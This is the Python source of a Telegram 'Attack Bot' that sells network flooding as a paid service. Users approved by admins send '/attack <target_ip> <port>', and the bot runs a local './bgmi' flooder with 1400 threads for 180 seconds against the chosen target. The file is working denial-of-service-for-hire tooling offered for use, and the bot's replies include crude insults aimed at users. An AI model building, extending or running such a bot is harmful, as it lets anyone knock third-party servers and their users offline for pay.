import subprocess
import json
import os
import datetime
import asyncio
from telegram import Update, Chat, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME, CHANNEL_LINK, CHANNEL_LOGO

USER_FILE = "users.json"
DEFAULT_THREADS = 1400
DEFAULT_PACKET = 9
DEFAULT_DURATION = 180  # Default attack duration

users = {}
user_processes = {}  # Track running attack processes per user

def load_users():
    """Load approved users from file."""
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    """Save approved users to file."""
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

async def is_group_chat(update: Update) -> bool:
    """Check if chat is a group or supergroup."""
    return update.message.chat.type in [Chat.GROUP, Chat.SUPERGROUP]

async def private_chat_warning(update: Update) -> None:
    """Warn users against using the bot in private chat."""
    await update.message.reply_text("LVDE GROUP ME JAKE USE KAR. YAAHA GAND NA MARA.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send channel link, logo, and bot info."""
    chat_id = update.message.chat.id
    
    message = (
        "🚀 **Welcome to the Attack Bot!** 🚀\n\n"
        "🔹 This bot allows you to launch attacks by cmd /attack.\n"
        "🔹 Direct messege me for paid service.\n"
        "🔹 Join our channel for updates:\n"
        f"[🔗 Click Here]({CHANNEL_LINK})\n\n"
        "💻 **Developed by**: " + f"@{OWNER_USERNAME}"
    )
    
    # Send the channel logo if available
    if os.path.exists(CHANNEL_LOGO):
        with open(CHANNEL_LOGO, "rb") as logo:
            await context.bot.send_photo(chat_id=chat_id, photo=InputFile(logo), caption=message, parse_mode="Markdown")
    else:
        await update.message.reply_text(message, parse_mode="Markdown")

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Add a user to the approved list (Admin only)."""
    if str(update.message.from_user.id) not in ADMIN_IDS:
        await update.message.reply_text("❌ ONLY OWNER CAN USE THIS COMMAND.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /add <user_id>")
        return

    user_id = context.args[0]
    users[user_id] = True
    save_users()

    await update.message.reply_text(f"✅ User {user_id} has been added to the approved list.")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Remove a user from the approved list (Admin only)."""
    if str(update.message.from_user.id) not in ADMIN_IDS:
        await update.message.reply_text("❌ ONLY OWNER CAN USE THIS COMMAND.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /remove <user_id>")
        return

    user_id = context.args[0]
    if user_id in users:
        del users[user_id]
        save_users()
        await update.message.reply_text(f"✅ User {user_id} has been removed from the approved list.")
    else:
        await update.message.reply_text(f"⚠️ User {user_id} is not in the approved list.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Execute an attack (Approved users only)."""
    if not await is_group_chat(update):
        await private_chat_warning(update)
        return

    user_id = str(update.message.from_user.id)

    if user_id not in users:
        await update.message.reply_text("❌ You are not approved to use this command ❌ request approval @Riyahacksyt.")
        return

    if len(context.args) != 2:
        await update.message.reply_text('Usage: /attack <target_ip> <port>')
        return

    target_ip = context.args[0]
    port = context.args[1]

    if user_id in user_processes and user_processes[user_id].poll() is None:
        await update.message.reply_text("⚠️ An attack is already running. Please wait for it to finish.")
        return

    flooding_command = ['./bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
    
    process = subprocess.Popen(flooding_command)
    user_processes[user_id] = process

    await update.message.reply_text(f'🚀 Attack started: {target_ip}:{port} for {DEFAULT_DURATION} seconds.')

    await asyncio.sleep(DEFAULT_DURATION)

    process.terminate()
    del user_processes[user_id]

    await update.message.reply_text(f'✅ Attack finished: {target_ip}:{port}.\n\n💬 LVDE AUKAAT SE FEEDBACK DEDE NHI TOH REMOVE KAR DUNGA BOT SE.')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Display help message."""
    if not await is_group_chat(update):
        await private_chat_warning(update)
        return

    response = (
        f"🔹 Welcome to the Flooding Bot by @{OWNER_USERNAME}! Here are the commands:\n\n"
        "📌 **User Commands:**\n"
        "/attack <target_ip> <port> - Start an attack (Approved users only)\n\n"
        "🔑 **Admin Commands:**\n"
        "/add <user_id> - Approve a user\n"
        "/remove <user_id> - Revoke a user's access\n"
    )
    await update.message.reply_text(response)

def main() -> None:
    """Start the bot."""
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("help", help_command))

    global users
    users = load_users()
    application.run_polling()

if __name__ == '__main__':
    main()
